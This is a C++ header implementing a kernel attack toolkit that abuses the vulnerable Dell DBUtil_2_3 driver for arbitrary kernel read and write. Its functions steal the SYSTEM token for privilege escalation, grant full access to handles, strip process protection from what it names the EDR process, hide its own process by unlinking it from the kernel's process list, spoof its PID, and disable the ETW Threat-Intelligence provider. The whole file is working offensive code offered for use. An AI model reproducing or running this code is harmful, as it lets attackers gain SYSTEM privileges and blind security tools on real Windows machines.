#pragma once
#include "typedefs.h"
#include "NtoskrnlOffsets.h"
#include <Psapi.h>
#include <iostream>

static const DWORD DBUTIL_READ_IOCTL = 0x9B0C1EC4;
static const DWORD DBUTIL_WRITE_IOCTL = 0x9B0C1EC8;

class KernelOps
{
public:
	HANDLE Device;
	DWORD64 EtwProvRegHandle;
	DWORD64 GUIDRegEntryAddress;
	ULONG64 kernelBase;
	DWORD64 systemEprocessAddr= PsInitialSystemProcess();
	DWORD64 ourEproc;
	CLIENT_ID ourProc;
	NtoskrnlOffsetsBuild Offsets;
	KernelOps() {

		Device = CreateFileW(L"\\\\.\\DBUtil_2_3", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
		if (Device == INVALID_HANDLE_VALUE) {
			std::cout << "Unable to obtain a handle to the device object: " << GetLastError() << std::endl;
			ExitProcess(0);
		}
		kernelBase = GetKernelBaseAddress();
		systemEprocessAddr = PsInitialSystemProcess();
		ourProc.UniqueProcess = (HANDLE)GetCurrentProcessId();
	};

	DWORD ReadPrimitive(DWORD64 Address) {
		DBUTIL_READ_BUFFER ReadBuff{};
		ReadBuff.Address = Address;
		DWORD BytesRead;
		DeviceIoControl(Device,
			DBUTIL_READ_IOCTL,
			&ReadBuff,
			sizeof(ReadBuff),
			&ReadBuff,
			sizeof(ReadBuff),
			&BytesRead,
			nullptr);
		return ReadBuff.value;
	}

	void WritePrimitive(DWORD64 Address, long long Value) {
		DBUTIL_WRITE_BUFFER WriteBuff{};
		WriteBuff.Address = Address;
		WriteBuff.Value = Value;

		DWORD BytesWritten = 0;

		DeviceIoControl(Device,
			DBUTIL_WRITE_IOCTL,
			&WriteBuff,
			sizeof(WriteBuff),
			&WriteBuff,
			sizeof(WriteBuff),
			&BytesWritten,
			nullptr);
	}
	BYTE ReadBYTE(DWORD64 Address) {
		return ReadPrimitive(Address) & 0xffffff;
	}


	WORD ReadWORD(DWORD64 Address) {
		return ReadPrimitive(Address) & 0xffff;
	}

	DWORD ReadDWORD(DWORD64 Address) {
		return ReadPrimitive(Address);
	}

	DWORD64 ReadDWORD64(DWORD64 Address) {
		return (static_cast<DWORD64>(ReadDWORD(Address + 4)) << 32) | ReadDWORD(Address);
	}

	void WriteDWORD64(DWORD64 Address, long long Value) {
		WritePrimitive(Address, Value);
	}

	VOID WriteBySize(SIZE_T Size, DWORD64 Address, DWORD* Buffer) {
		struct DBUTIL23_MEMORY_WRITE* WriteBuff = (DBUTIL23_MEMORY_WRITE*)calloc(1, Size + sizeof(struct DBUTIL23_MEMORY_WRITE));
		if (!WriteBuff) {
			exit(1);
		}
		WriteBuff->Address = Address;
		WriteBuff->Offset = 0;
		DWORD BytesReturned;

		if (Address < 0x0000800000000000) {
			exit(1);
		}
		if (Address < 0xFFFF800000000000) {
			exit(1);
		}

		memcpy(WriteBuff->Buffer, Buffer, Size);
		DeviceIoControl(Device,
			DBUTIL_WRITE_IOCTL,
			WriteBuff,
			offsetof(struct DBUTIL23_MEMORY_WRITE, Buffer) + (DWORD)Size,
			WriteBuff,
			offsetof(struct DBUTIL23_MEMORY_WRITE, Buffer) + (DWORD)Size,
			&BytesReturned,
			NULL);
	}

	DWORD64 GetKernelBaseAddress() {
		DWORD cb = 0;
		LPVOID drivers[1024];

		if (EnumDeviceDrivers(drivers, sizeof(drivers), &cb)) {
			return (DWORD64)drivers[0];
		}
		return NULL;
	}

	DWORD64 PsInitialSystemProcess()
	{
		DWORD64 res;
		ULONG64 ntos = (ULONG64)LoadLibrary(L"ntoskrnl.exe");
		ULONG64 addr = (ULONG64)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
		if (kernelBase) {
			res = ReadDWORD64(addr - ntos + kernelBase);
		}
		return res;
	}
	//pid 4 as stop 
	DWORD64 LookupEprocessByPid(DWORD64 papaProc, CLIENT_ID procid) {
		DWORD64 ActiveProcLinkPointer = papaProc + Offsets.ActiveProcessLinks;
		DWORD64 nextFlinkAddr = ReadDWORD64(ActiveProcLinkPointer);
		DWORD64 nextEproccess = nextFlinkAddr - Offsets.ActiveProcessLinks;
		DWORD64 targetPID = ReadDWORD64(nextEproccess + Offsets.UniqueProcessId);
		while (targetPID != (DWORD64)procid.UniqueProcess) {
			nextFlinkAddr = ReadDWORD64(nextEproccess + Offsets.ActiveProcessLinks);
			nextEproccess = nextFlinkAddr - Offsets.ActiveProcessLinks;
			targetPID = ReadDWORD64(nextEproccess + Offsets.UniqueProcessId);
		}
		return nextEproccess;
	}
	// stop if found the first again
	DWORD64 LookupEThreadByCid(DWORD64 EprocThreadListHead, CLIENT_ID procid) {
		DWORD64 nextFlinkAddr = EprocThreadListHead;
		DWORD64 nextEthread = nextFlinkAddr - Offsets.ThreadListEntry;
		BYTE cid[16];

		for (int i = 0; i < 16; i++)
			cid[i] = ReadBYTE(nextEthread + Offsets.Cid + i);

		MY_CLIENT_ID* targetPIDValue = (MY_CLIENT_ID*)(void*)cid;

		while ((targetPIDValue->UniqueProcess != (PVOID)procid.UniqueProcess) && (targetPIDValue->UniqueThread != (PVOID)procid.UniqueThread)) {

			// Going to the next _ETHREAD
			nextFlinkAddr = ReadDWORD64(nextEthread + Offsets.ThreadListEntry);
			nextEthread = nextFlinkAddr - Offsets.ThreadListEntry;
			cid[16];
			for (int i = 0; i < 16; i++)
				cid[i] = ReadBYTE(nextEthread + Offsets.Cid + i);
			targetPIDValue = (MY_CLIENT_ID*)(void*)cid;
		}

		return nextEthread;

	}

	DWORD64 ExpLookupHandleTableEntry(DWORD64 HandleTable, ULONGLONG Handle)
	{
		ULONGLONG v2;
		LONGLONG v3; 
		ULONGLONG result; 
		ULONGLONG v5;

		ULONGLONG a1 = (ULONGLONG)HandleTable;

		v2 = Handle & 0xFFFFFFFFFFFFFFFCui64;
		if (v2 >= ReadDWORD(a1)) {
			result = 0i64;
		}
		else {
			v3 = ReadDWORD64(a1 + 8);
			if (ReadDWORD64(a1 + 8) & 3) {
				if ((ReadDWORD(a1 + 8) & 3) == 1) {
					v5 = ReadDWORD64(v3 + 8 * (v2 >> 10) - 1);
					result = v5 + 4 * (v2 & 0x3FF);
				}
				else {
					v5 = ReadDWORD(ReadDWORD(v3 + 8 * (v2 >> 19) - 2) + 8 * ((v2 >> 10) & 0x1FF));
					result = v5 + 4 * (v2 & 0x3FF);
				}
			}
			else {
				result = v3 + 4 * v2;
			}
		}
		return (DWORD64)result;
	}


	DWORD64 RetriveEprocessHandleTable(CLIENT_ID procid) {
		DWORD64 targetProc = LookupEprocessByPid(systemEprocessAddr, procid);
		return ReadDWORD64(targetProc + Offsets.ObjectTable);
	}

	DWORD64 RetriveEprocessThreadList(CLIENT_ID procid) {
		DWORD64 targetProc = LookupEprocessByPid(systemEprocessAddr, procid);
		return ReadDWORD64(targetProc + Offsets.ThreadListHead);

	}
	//try to read and write dword64 - remind yourself why 
	// seperate func for read HANDLE_TABLE_ENTRY
	PVOID GetObjectAddrFromHandle(DWORD64 hTableAddr, ULONGLONG hValue) {
		DWORD64 HandleTableEntry = ExpLookupHandleTableEntry(hTableAddr, hValue);
		BYTE forentry[16];
		for (int i = 0; i < 16; i++)
			forentry[i] = ReadBYTE(HandleTableEntry + i);
		HANDLE_TABLE_ENTRY* HandleTableEntryObject = (HANDLE_TABLE_ENTRY*)(void*)forentry;
		return HandleTableEntryObject->Object;
	}

	void ElevateHandle(DWORD64 hTableAddr, ULONGLONG hValue) {
		DWORD64 HandleTableEntry = ExpLookupHandleTableEntry(hTableAddr, hValue);
		BYTE forentry[16];
		for (int i = 0; i < 16; i++)
			forentry[i] = ReadBYTE(HandleTableEntry + i);
		HANDLE_TABLE_ENTRY* HandleTableEntryObject = (HANDLE_TABLE_ENTRY*)(void*)forentry;
		std::cout << "[#]Got HANDLE at address of: "<<std::hex << HandleTableEntry<<
					 " with GrantedAccess bits of: "<<std::hex<<HandleTableEntryObject->GrantedAccess << std::endl;
		HandleTableEntryObject->GrantedAccess = 0x1fffff;
		BYTE NewHandle[16];
		std::memcpy(NewHandle, HandleTableEntryObject, 16);
		for (int i = 0; i < 16; i++)
		{
			DWORD NewHandleData = NewHandle[i];
			WriteBySize(sizeof(BYTE), HandleTableEntry + i, &NewHandleData);
		}
		std::cout << "[#]Elevated HANDLE to GrantedAccess bits of: " << std::hex << 0x1fffff <<" (FULL_CONTROL)"<< std::endl;

	}

	DWORD64 RetriveTokenAdress(CLIENT_ID procid) {
		return  LookupEprocessByPid(systemEprocessAddr, procid) + Offsets.Token;
	}

	DWORD64 RetriveSystemTokenAdress() {
		return  systemEprocessAddr + Offsets.Token;
	}

	void TransferToken(CLIENT_ID Src, CLIENT_ID Dst) {

		DWORD64 DestinationTokenAddress = RetriveTokenAdress(Dst);
		DWORD64 SourceTokenAddress = RetriveTokenAdress(Src);
		BYTE DestinationToken[8];
		for (int i = 0; i < 8; i++)
			DestinationToken[i] = ReadBYTE(DestinationTokenAddress + i);
		EX_FAST_REF* DstTokenObj = (EX_FAST_REF*)(void*)DestinationToken;
		std::cout << "[#]Got:"<<std::hex<<DstTokenObj->Object <<" for Process:"<<(int)(DWORD)Dst.UniqueProcess<< std::endl;

		BYTE SourceToken[8];
		for (int i = 0; i < 8; i++)
			SourceToken[i] = ReadBYTE(SourceTokenAddress + i);
		EX_FAST_REF* systemtoken = (EX_FAST_REF*)(void*)SourceToken;
		std::cout << "[#]Got:" << std::hex << systemtoken->Object << " for Process:" << (int)(DWORD)Src.UniqueProcess << std::endl;
		std::cout << "[#]Elevating token from from:" << std::hex << DstTokenObj->Value << " To:" << std::hex << systemtoken->Value << std::endl;
		DstTokenObj->Value = systemtoken->Value;
		BYTE newtoken[8];
		std::memcpy(newtoken, DstTokenObj, 8);
		for (int i = 0; i < 8; i++)
		{
			DWORD NewTokenData = newtoken[i];
			WriteBySize(sizeof(BYTE), DestinationTokenAddress + i, &NewTokenData);
		}
		std::cout << "[#]Finished -> who are you now?"<<std::endl;

	}

	void EnableDisableProtection(CLIENT_ID targetProcess, BOOL Enable) {
		DWORD64 EdrEproc = LookupEprocessByPid(systemEprocessAddr, targetProcess);
		std::cout << "[#]Found Target EPROCESS to "<<(Enable ? "ENABLE":"DISABLE") << std::endl;
		BYTE protect[1];
		protect[0] = ReadBYTE(EdrEproc + Offsets.Protection);
		PS_PROTECTION* procObj = (PS_PROTECTION*)(void*)protect;
		std::cout << "[#]Editing PS_PROTECTION to: " << (Enable ? 1: 0) << std::endl << "[#]Editing Signer to: " << (Enable ? 3 : 0) << std::endl;
		procObj->Type = Enable ? 1 : 0;
		procObj->Signer = Enable ? 3 : 0;
		BYTE newProtect[1];
		std::memcpy(newProtect, procObj, 1);
		DWORD newProcData = newProtect[0];
		WriteBySize(sizeof(BYTE), EdrEproc + Offsets.Protection, &newProcData);
		std::cout << "[#]" << (Enable ? "ENABLED" : "DISABLED") << std::endl;
	}

	void HideMyProcess(CLIENT_ID OurProc) {

		DWORD64 ourEproc = LookupEprocessByPid(systemEprocessAddr, OurProc);
		DWORD64 ourFlink = ReadDWORD64(ourEproc + Offsets.ActiveProcessLinks);
		DWORD64 ourBlink = ReadDWORD64(ourEproc + Offsets.ActiveProcessLinks+0x8);
		WriteDWORD64(ourBlink, ourFlink);
		WriteDWORD64(ourFlink + 8, ourBlink);
		WriteDWORD64(ourEproc + Offsets.ActiveProcessLinks, 0);
		WriteDWORD64(ourEproc + Offsets.ThreadListEntry+0x8, 0);
		std::cout << "[#]Cant see me (-john cena)"<< std::endl;

	}

	void ChangeMyPid(CLIENT_ID OurProc, int NewPid) {
		DWORD64 ourEproc = LookupEprocessByPid(systemEprocessAddr, OurProc);
		std::cout << "[#]Found our EPROCESS @: " << ourEproc << std::endl;
		WriteDWORD64(ourEproc + Offsets.UniqueProcessId, NewPid);
		std::cout << "[#]Changed PID to: " << NewPid<<std::endl;
	}

	void EnableDisableETW(BOOL Enable) {
		EtwProvRegHandle = ReadDWORD64(kernelBase + Offsets.EtwThreatIntProvRegHandle);
		GUIDRegEntryAddress = ReadDWORD64(EtwProvRegHandle + Offsets.GuidEntry);
		DWORD aa = Enable?0x1:0x0;
		WriteBySize(sizeof(BYTE), GUIDRegEntryAddress + Offsets.EnableInfo, &aa);
		std::cout << "[#]"<<(Enable?"Enabled":"Disabled") << " ETW - Microsoft - Windows - Threat - Intelligence" << std::endl;
	}
};

